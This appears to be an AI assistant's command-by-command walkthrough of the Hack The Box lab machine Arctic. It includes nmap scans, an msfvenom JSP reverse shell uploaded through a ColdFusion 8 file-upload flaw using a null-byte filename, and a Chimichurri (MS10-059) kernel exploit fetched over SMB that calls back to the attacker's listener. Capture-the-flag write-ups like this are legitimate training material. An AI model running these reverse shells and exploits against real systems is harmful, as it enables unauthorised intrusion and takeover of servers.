Awesome work finishing HTB: Arctic! Here's your walkthrough-style command breakdown organized by phase, just the way you like it:

---

# 🧊 HTB: Arctic Walkthrough

## 📍 Target Info
- **IP**: 10.10.10.11
- **OS**: Windows Server 2008 R2
- **Difficulty**: Easy
- **User**: `tolis`
- **Root Method**: MS10-059 exploit via Chimichurri

---

## 🔍 Reconnaissance

### 🔎 Full TCP Scan
```bash
nmap -p- --min-rate 10000 -oA nmap-alltcp 10.10.10.11
```

### 🔎 Version & Script Scan
```bash
nmap -sC -sV -p 135,8500,49154 -oA nmap-service 10.10.10.11
```

---

## 🌐 Web Enumeration

### 🌐 Port 8500 Analysis
```bash
curl http://10.10.10.11:8500/
# or
nc 10.10.10.11 8500
```

Revealed ColdFusion 8 interface:
- `/CFIDE/administrator/enter.cfm` → Login panel
- `/userfiles/file/` → Web root accessible

---

## ⚔️ Exploitation (Initial Foothold)

### Method 1: CVE-2009-2265 – Unauthenticated File Upload

#### 🧬 Generate JSP Reverse Shell
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.14 LPORT=443 -f raw > shell.jsp
```

#### 🗂 Upload Shell via ColdFusion vuln
```bash
cp shell.jsp shell.txt
curl -X POST -F "newfile=@shell.txt;type=application/x-java-archive;filename=shell.txt" \
"http://10.10.10.11:8500/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/shell.jsp%00"
```

#### 🔁 Trigger Reverse Shell
```bash
curl http://10.10.10.11:8500/userfiles/file/shell.jsp
```

### 🧲 Netcat Listener
```bash
rlwrap nc -nvlp 443
```

---

## 🧪 Privilege Escalation

### 📋 Check System Info
```bash
systeminfo
```

**No hotfixes installed** — prime for kernel exploits.

### 🔎 Enumerate with Windows Exploit Suggester
```bash
# On Kali
git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git
cd Windows-Exploit-Suggester
python3 windows-exploit-suggester.py --update

# Save output from systeminfo
python3 windows-exploit-suggester.py --database 2020-XX-XX-mssb.xls --systeminfo sysinfo.txt
```

**Selected**: MS10-059 — Chimichurri

### 📤 Transfer Exploit Binary
```bash
# On Kali
smbserver.py share .  # from impacket-scripts

# On Arctic shell
net use \\10.10.14.14\share
copy \\10.10.14.14\share\Chimichurri.exe .
```

### 💣 Execute Exploit
```bash
Chimichurri.exe 10.10.14.14 443
```

### 🧲 Netcat Listener
```bash
rlwrap nc -nvlp 443
```

---

## 🏁 Flags

### 🧑‍💻 User
```bash
type C:\Users\tolis\Desktop\user.txt
```

### 👑 Root
```bash
type C:\Users\Administrator\Desktop\root.txt
```